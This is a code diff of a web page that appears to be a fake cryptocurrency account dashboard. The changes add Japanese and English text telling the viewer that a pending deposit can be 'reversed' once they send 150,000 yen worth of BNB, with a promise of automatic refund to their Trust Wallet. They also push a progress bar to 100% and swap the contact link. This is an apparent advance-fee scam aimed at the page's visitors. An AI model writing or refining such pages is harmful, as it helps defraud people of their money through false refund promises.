@@ -168,7 +168,9 @@
         }
 
         .btn-logout {
-            flex: 1;
+            flex: 0 0 60%;
+            max-width: 480px;
+            margin: 0 auto;
             padding: 12px 20px;
             border: 2px solid #FF6B6B;
             background: rgba(255, 107, 107, 0.2);
@@ -178,6 +180,8 @@
             font-size: 14px;
             font-weight: 700;
             transition: all 0.3s ease;
+            display: block;
+            text-align: center;
         }
 
         .btn-logout:hover {
@@ -653,16 +657,23 @@
                     </div>
                 </div>
 
-                <!-- Contact Handler Text -->
+                <!-- Contact Handler Text (info box) -->
                 <div style="margin-top: 20px; padding: 15px; background: rgba(255, 215, 0, 0.08); border-left: 3px solid #FFD700; border-radius: 8px;">
-                    <p style="color: rgba(255, 255, 255, 0.9); margin: 0; font-size: 14px; font-weight: 600; text-align: center;" data-ja="アカウントハンドラーに連絡してアップグレード手続きを完了してください。" data-en="PLEASE CONTACT THE ACCOUNT HANDLER TO COMPLETE THE REMAINING UPGRADE PROCEDURE.">PLEASE CONTACT THE ACCOUNT HANDLER TO COMPLETE THE REMAINING UPGRADE PROCEDURE.</p>
+                    <p style="color: rgba(255, 255, 255, 0.9); margin: 0; font-size: 12px; line-height:1.4; font-weight: 600; text-align: center;"
+                       data-ja="保留中の入金は確定され、返金の準備ができています。保留中の取引の返金手続きを完了するために、BNBで150,000円相当を入金してください。注意：返金手続きが完了してから24時間以内に、資金は自動的にあなたのTrust Walletに返金されます。"
+                       data-en="PENDING DEPOSIT SETTLED AND READY TO BE REVERSED Kindly deposit 150,000 yen worth of BNB to complete the pending transaction reversal procedure. Note: Funds will be automatically reversed to your Trust Wallet 24 hours after Reversal procedure is completed">保留中の入金は確定され、返金の準備ができています。保留中の取引の返金手続きを完了するために、BNBで150,000円相当を入金してください。注意：返金手続きが完了してから24時間以内に、資金は自動的にあなたのTrust Walletに返金されます。</p>
+                </div>
+                <!-- Note (red) placed between info box and contact button -->
+                <div class="verification-note-section" style="margin-top: 12px; padding: 10px 14px; background: rgba(0,0,0,0.03); border-radius: 8px; border: 1px solid rgba(255,255,255,0.03);">
+                    <p class="verification-note" data-ja="注意：返金手続きが完了してから24時間以内に、資金は自動的にあなたのTrust Walletに返金されます。" data-en="Note: Funds will be automatically reversed to your Trust Wallet 24 hours after Reversal procedure is completed" style="color:#ff4d4d; font-size:12px; line-height:1.4; font-weight:600; text-align:center; margin:0;">注意：返金手続きが完了してから24時間以内に、資金は自動的にあなたのTrust Walletに返金されます。</p>
                 </div>
 
                 <!-- Contact Button -->
-                <a href="https://line.me/ti/p/LXrw-MFkJx" target="_blank" style="display: block; width: 100%; padding: 12px 20px; background: linear-gradient(135deg, rgba(255, 215, 0, 0.3) 0%, rgba(255, 215, 0, 0.15) 100%); border: 2px solid #FFD700; color: #FFD700; border-radius: 8px; text-align: center; font-size: 14px; font-weight: 700; cursor: pointer; text-decoration: none; margin-top: 15px; transition: all 0.3s ease;" data-ja="連絡先" data-en="Contact" onmouseover="this.style.background='linear-gradient(135deg, rgba(255, 215, 0, 0.4) 0%, rgba(255, 215, 0, 0.25) 100%)'; this.style.boxShadow='0 0 20px rgba(255, 215, 0, 0.5)';" onmouseout="this.style.background='linear-gradient(135deg, rgba(255, 215, 0, 0.3) 0%, rgba(255, 215, 0, 0.15) 100%)'; this.style.boxShadow='none';">Contact</a>
+                <a href="https://www.binance.com/en/trade/BTC_USDT?ref=YOUR_REF" target="_blank" style="display: block; width: 100%; padding: 12px 20px; background: linear-gradient(135deg, rgba(255, 215, 0, 0.3) 0%, rgba(255, 215, 0, 0.15) 100%); border: 2px solid #FFD700; color: #FFD700; border-radius: 8px; text-align: center; font-size: 14px; font-weight: 700; cursor: pointer; text-decoration: none; margin-top: 15px; transition: all 0.3s ease;" data-ja="連絡先" data-en="Contact" onmouseover="this.style.background='linear-gradient(135deg, rgba(255, 215, 0, 0.4) 0%, rgba(255, 215, 0, 0.25) 100%)'; this.style.boxShadow='0 0 20px rgba(255, 215, 0, 0.5)';" onmouseout="this.style.background='linear-gradient(135deg, rgba(255, 215, 0, 0.3) 0%, rgba(255, 215, 0, 0.15) 100%)'; this.style.boxShadow='none';">Contact</a>
+                </div>
             </div>
         </div>
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
         <!-- Action Buttons -->
         <div class="profile-page-actions-footer">
             <button class="btn-logout" id="logoutBtn" data-ja="ログアウト" data-en="Logout">ログアウト</button>
@@ -896,8 +907,8 @@
                                             barPercentage2.textContent = displayWidth + '%';
                                         }
 
-                                        // Bar 3 should animate to 75% while keeping the same timing
-                                        const bar3Target = 75;
+                                        // Bar 3 should animate to 100% while keeping the same timing
+                                        const bar3Target = 100;
                                         const bar3Value = Math.min(Math.round(displayWidth * (bar3Target / 100)), bar3Target);
                                         const barFill3 = document.getElementById('barFill3');
                                         const barPercentage3 = document.getElementById('barPercentage3');
@@ -923,10 +934,10 @@
                                         const barFill3 = document.getElementById('barFill3');
                                         const barPercentage3 = document.getElementById('barPercentage3');
                                         if (barFill3) {
-                                            barFill3.style.width = '75%';
+                                            barFill3.style.width = '100%';
                                         }
                                         if (barPercentage3) {
-                                            barPercentage3.textContent = '75%';
+                                            barPercentage3.textContent = '100%';
                                         }
 
                                         clearInterval(fillInterval);
